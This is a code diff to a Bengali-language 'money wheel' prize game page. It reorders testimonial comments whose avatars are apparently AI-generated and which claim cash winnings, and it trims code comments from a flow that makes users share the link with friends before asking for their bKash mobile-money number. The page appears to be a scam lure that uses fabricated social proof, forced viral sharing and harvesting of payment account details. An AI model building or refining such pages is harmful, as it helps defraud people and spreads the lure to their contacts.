@@ -215,9 +215,9 @@
 
     <div class="comments-section">
         <h3>সাম্প্রতিক মন্তব্যসমূহ</h3>
-        <div class="comment-item">
-            <div class="comment-avatar"><img src="https://i.postimg.cc/zGhpcLrJ/Flux-Dev-A-25yearold-Bangladeshi-boys-passportsized-photo-with-1.jpg" alt="মোঃ আরিফুল ইসলাম Avatar"></div>
-            <div class="comment-content"><strong>মোঃ আরিফুল ইসলাম</strong><p>এডমিন কে ধন্যবাদ, আমি ৮০ টাকা পেয়েছি। সবাই চেষ্টা করুন।</p><span class="comment-time">৫ মিনিট আগে</span></div>
+        <div class="comment-item"> <!-- নাসরিন সুলতানা's comment moved to the top -->
+            <div class="comment-avatar"><img src="https://i.postimg.cc/ZqP77HJX/1747083315660.jpg" alt="নাসরিন সুলতানা Avatar"></div>
+            <div class="comment-content"><strong>নাসরিন সুলতানা</strong><p>খুবই মজার খেলা। ৪০ টাকা জিতলাম। ধন্যবাদ।</p><span class="comment-time">২ ঘন্টা আগে</span></div>
         </div>
         <div class="comment-item">
             <div class="comment-avatar"><img src="https://i.postimg.cc/s26cB5P4/cee365e3-e6d3-4b23-b80d-a3b3c9c70f2a.jpg" alt="সুমি আক্তার Avatar"></div>
@@ -227,9 +227,9 @@
             <div class="comment-avatar"><img src="https://i.postimg.cc/gkr7z3K6/Flux-Dev-A-25yearold-young-man-standing-confidently-in-a-wellf-3.jpg" alt="Rahman Khan Avatar"></div>
             <div class="comment-content"><strong>Rahman Khan</strong><p>Thanks admin! Got 100 Taka. Shared with friends.</p><span class="comment-time">১ ঘন্টা আগে</span></div>
         </div>
-         <div class="comment-item">
-            <div class="comment-avatar"><img src="https://i.postimg.cc/ZqP77HJX/1747083315660.jpg" alt="নাসরিন সুলতানা Avatar"></div>
-            <div class="comment-content"><strong>নাসরিন সুলতানা</strong><p>খুবই মজার খেলা। ৪০ টাকা জিতলাম। ধন্যবাদ।</p><span class="comment-time">২ ঘন্টা আগে</span></div>
+         <div class="comment-item"> <!-- মোঃ আরিফুল ইসলাম's comment moved to the bottom -->
+            <div class="comment-avatar"><img src="https://i.postimg.cc/zGhpcLrJ/Flux-Dev-A-25yearold-Bangladeshi-boys-passportsized-photo-with-1.jpg" alt="মোঃ আরিফুল ইসলাম Avatar"></div>
+            <div class="comment-content"><strong>মোঃ আরিফুল ইসলাম</strong><p>এডমিন কে ধন্যবাদ, আমি ৮০ টাকা পেয়েছি। সবাই চেষ্টা করুন।</p><span class="comment-time">৫ মিনিট আগে</span></div>
         </div>
     </div>
 
@@ -341,15 +341,13 @@
             const shareMessageForFriends = `আমি "${wonPrize.label}" জিতেছি টাকার চাকা গেম খেলে! 🤑 তুমিও খেলতে পারো আর জিততে পারো আকর্ষণীয় পুরস্কার!`;
 
             const showBikashAfterDelay = () => {
-                // Ensure shareSection is hidden before showing bikashSection
                 if (shareSection.style.display !== 'none') {
                     shareSection.style.display = 'none';
                 }
                 scheduleBikashBox();
             };
 
-            // Start the 12-second timer immediately when the share button is clicked
-            setTimeout(showBikashAfterDelay, 12000); // 12000 milliseconds = 12 seconds
+            setTimeout(showBikashAfterDelay, 12000);
 
 
             if (navigator.share) {
@@ -360,52 +358,42 @@
                 .then(() => {
                     console.log('Share dialog action completed (shared or closed).');
                     showShareConfirmationVisual();
-                    shareSection.style.display = 'none'; // Hide share section immediately
-                    // The 12s timer for scheduleBikashBox is already running.
+                    shareSection.style.display = 'none';
                 })
                 .catch((err) => {
                     console.error('Error sharing or share cancelled by user:', err);
                     showShareConfirmationVisual();
                     shareMessagePara.innerHTML = `<span class="share-instruction-text">শেয়ার প্রক্রিয়া সম্পন্ন হয়েছে অথবা বাতিল করা হয়েছে। পরবর্তী ধাপে যান।</span>`;
-                    // Hide share section after a short delay to show the message
                     setTimeout(() => {
-                         if (shareSection.style.display !== 'none') { // Check if not already hidden
+                         if (shareSection.style.display !== 'none') {
                             shareSection.style.display = 'none';
                          }
                     }, 2000);
-                    // The 12s timer for scheduleBikashBox is already running.
                 });
             } else {
-                // Fallback logic for when navigator.share is not supported
                 const messengerAppUrl = `fb-messenger://share?link=${encodeURIComponent(gameLink)}`;
                 const alertMessage = `মেসেঞ্জার অ্যাপে সরাসরি শেয়ার করার চেষ্টা করা হচ্ছে...`;
                 console.log("navigator.share not supported. Attempting to open Messenger app URL directly.");
-                // console.log("Alert message content (would have been shown):", alertMessage); // Alert is hidden as per previous requests
 
-                // This timeout handles immediate feedback for the fallback attempt
                 setTimeout(() => {
                     showShareConfirmationVisual();
-                    if (shareSection.style.display !== 'none') { // Check if not already hidden
+                    if (shareSection.style.display !== 'none') {
                         shareSection.style.display = 'none';
                     }
                     shareButton.disabled = false; 
                 }, 2500); 
                 
-                window.location.href = messengerAppUrl; // Attempt to open messenger
-                // The 12s timer for scheduleBikashBox is already running.
+                window.location.href = messengerAppUrl;
             }
         });
 
         function scheduleBikashBox() {
             const bikashInstructionPara = bikashSection.querySelector('p:first-child');
             if (wonPrize) {
-                 // Updated message as per the last request
                  bikashInstructionPara.innerHTML = `সফলভাবে শেয়ার করার (অথবা চেষ্টার) জন্য ধন্যবাদ! আপনার জেতা পুরস্কারটি পেতে, নিচের বক্সে আপনার বিকাশ নাম্বার দিন এবং সেন্ড বাটনে ক্লিক করে, কনফার্ম করুন:`;
             } else {
-                 // Default message if wonPrize is somehow not set (should not happen in normal flow)
                  bikashInstructionPara.innerHTML = `আপনার পুরস্কারটি পেতে, নিচের বক্সে আপনার বিকাশ নাম্বার দিন এবং সেন্ড বাটনে ক্লিক করুন:`;
             }
-            // Display bikash section without its own internal timeout
             bikashSection.style.display = 'block';
             bikashNumberInput.focus();
         }
